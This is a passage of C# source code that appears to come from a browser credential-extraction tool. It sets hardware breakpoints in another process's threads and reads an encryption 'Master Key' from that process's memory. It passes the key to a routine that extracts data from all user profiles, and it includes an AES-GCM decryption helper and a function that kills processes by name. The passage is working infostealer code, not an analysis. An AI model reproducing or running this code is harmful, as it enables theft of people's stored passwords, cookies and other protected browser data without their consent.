                Console.WriteLine($"Context captured. R14: 0x{context.R14:X}, R15: 0x{context.R15:X}, RIP: 0x{context.Rip:X}");
                ulong[] keyPtrs = config.UseR14 ? new[] { context.R14, context.R15 } : new[] { context.R15, context.R14 };
                foreach (var ptr in keyPtrs)
                {
                    if (ptr == 0) continue;
                    byte[] buffer = new byte[32];
                    int bytesRead;
                    if (ReadProcessMemory(hProcess, (IntPtr)ptr, buffer, buffer.Length, out bytesRead))
                    {
                        ulong dataPtr = ptr;
                        ulong length = BitConverter.ToUInt64(buffer, 8);
                        if (length == 32)
                        {
                            dataPtr = BitConverter.ToUInt64(buffer, 0);
                        }

                        byte[] key = new byte[32];
                        if (ReadProcessMemory(hProcess, (IntPtr)dataPtr, key, key.Length, out bytesRead))
                        {
                            if (key.Any(b => b != 0))
                            {
                                Console.WriteLine($"Extracted Master Key from 0x{dataPtr:X}");
                                ExtractAllProfilesData(key, config, userDataDir);
                                success = true;
                                break;
                            }
                        }
                    }
                }
            }

            CloseHandle(hThread);
            return success;
        }

        public static List<uint> GetAllThreads(uint processId)
        {
            List<uint> threads = new List<uint>();
            IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (snapshot != (IntPtr)(-1))
            {
                THREADENTRY32 te = new THREADENTRY32();
                te.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));
                if (Thread32First(snapshot, ref te))
                {
                    do
                    {
                        if (te.th32OwnerProcessID == processId) threads.Add(te.th32ThreadID);
                    } while (Thread32Next(snapshot, ref te));
                }
                CloseHandle(snapshot);
            }
            return threads;
        }

        public static void SetHardwareBreakpoint(uint threadId, IntPtr address)
        {
            IntPtr hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, threadId);
            if (hThread == IntPtr.Zero) return;

            SuspendThread(hThread);
            CONTEXT context = new CONTEXT();
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
            if (GetThreadContext(hThread, ref context))
            {
                context.Dr0 = (ulong)address;
                context.Dr7 = (context.Dr7 & ~3UL) | 3UL; // Set L0 and G0 bits
                SetThreadContext(hThread, ref context);
            }
            ResumeThread(hThread);
            CloseHandle(hThread);
        }

        public static void ClearHardwareBreakpoints(uint processId)
        {
            foreach (var threadId in GetAllThreads(processId))
            {
                IntPtr hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, threadId);
                if (hThread != IntPtr.Zero)
                {
                    SuspendThread(hThread);
                    CONTEXT context = new CONTEXT();
                    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                    if (GetThreadContext(hThread, ref context))
                    {
                        context.Dr0 = 0;
                        context.Dr7 &= ~3UL; // Disable DR0 Local and Global
                        SetThreadContext(hThread, ref context);
                    }
                    ResumeThread(hThread);
                    CloseHandle(hThread);
                }
            }
        }

        public static void SetResumeFlag(uint threadId)
        {
            IntPtr hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, false, threadId);
            if (hThread == IntPtr.Zero) return;

            SuspendThread(hThread);
            CONTEXT context = new CONTEXT();
            context.ContextFlags = CONTEXT_CONTROL;
            if (GetThreadContext(hThread, ref context))
            {
                context.EFlags |= 0x10000; // RF
                SetThreadContext(hThread, ref context);
            }
            ResumeThread(hThread);
            CloseHandle(hThread);
        }

        public static void KillProcessesByName(string name)
        {
            IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snapshot != (IntPtr)(-1))
            {
                PROCESSENTRY32 pe = new PROCESSENTRY32();
                pe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));
                if (Process32First(snapshot, ref pe))
                {
                    do
                    {
                        if (pe.szExeFile.Equals(name, StringComparison.OrdinalIgnoreCase))
                        {
                            IntPtr hProc = OpenProcess(PROCESS_TERMINATE, false, pe.th32ProcessID);
                            if (hProc != IntPtr.Zero)
                            {
                                TerminateProcess(hProc, 0);
                                CloseHandle(hProc);
                            }
                        }
                    } while (Process32Next(snapshot, ref pe));
                }
                CloseHandle(snapshot);
            }
        }
    }

    public static class MemoryHelper
    {
        public static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
        {
            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            try
            {
                return (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            }
            finally
            {
                handle.Free();
            }
        }
    }

    public static class BCryptAesGcm
    {
        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptGetProperty(IntPtr hObject, string pszProperty, byte[] pbOutput, uint cbOutput, out uint pcbResult, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, uint cbInput, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, byte[] pbKeyObject, uint cbKeyObject, byte[] pbSecret, uint cbSecret, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        public static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, uint cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, uint cbIV, byte[] pbOutput, uint cbOutput, out uint pcbResult, uint dwFlags);

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
        {
            public uint cbSize;
            public uint dwInfoVersion;
            public IntPtr pbNonce;
            public uint cbNonce;
            public IntPtr pbAuthData;
            public uint cbAuthData;
            public IntPtr pbTag;
            public uint cbTag;
            public IntPtr pbMacContext;
            public uint cbMacContext;
            public uint cbAAD;
            public ulong cbData;
            public uint dwFlags;
        }

        public const string BCRYPT_AES_ALGORITHM = "AES";
        public const string BCRYPT_CHAINING_MODE = "ChainingMode";
        public const string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
        public const string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";

        public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] aad, byte[] ciphertext, byte[] tag)
        {
            IntPtr hAlg = IntPtr.Zero;
            IntPtr hKey = IntPtr.Zero;
            try
            {
                if (BCryptOpenAlgorithmProvider(out hAlg, BCRYPT_AES_ALGORITHM, null, 0) != 0) return null;

                byte[] chainMode = Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_GCM + "\0");
                if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, chainMode, (uint)chainMode.Length, 0) != 0) return null;

                if (BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, (uint)key.Length, 0) != 0) return null;

                var authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
                authInfo.cbSize = (uint)Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
                authInfo.dwInfoVersion = 1;

                using (var pinnedNonce = new PinnedArray(nonce))
                using (var pinnedTag = new PinnedArray(tag))
                using (var pinnedAad = new PinnedArray(aad))
                {
                    authInfo.pbNonce = pinnedNonce.Addr;
                    authInfo.cbNonce = (uint)nonce.Length;
                    authInfo.pbTag = pinnedTag.Addr;
                    authInfo.cbTag = (uint)tag.Length;
                    if (aad != null)
                    {
                        authInfo.pbAuthData = pinnedAad.Addr;
                        authInfo.cbAuthData = (uint)aad.Length;
                    }

                    byte[] plainText = new byte[ciphertext.Length - 16];
                    uint pcbResult;
                    if (BCryptDecrypt(hKey, ciphertext, (uint)plainText.Length, ref authInfo, null, 0, plainText, (uint)plainText.Length, out pcbResult, 0) != 0)
                        return null;

                    return plainText;
                }
            }
            finally
            {
                if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
                if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
            }
        }

        private class PinnedArray : IDisposable
        {
            private GCHandle _handle;
            public IntPtr Addr => _handle.IsAllocated ? _handle.AddrOfPinnedObject() : IntPtr.Zero;
            public PinnedArray(byte[] arr) { if (arr != null) _handle = GCHandle.Alloc(arr, GCHandleType.Pinned); }
            public void Dispose() { if (_handle.IsAllocated) _handle.Free(); }
        }
    }
}
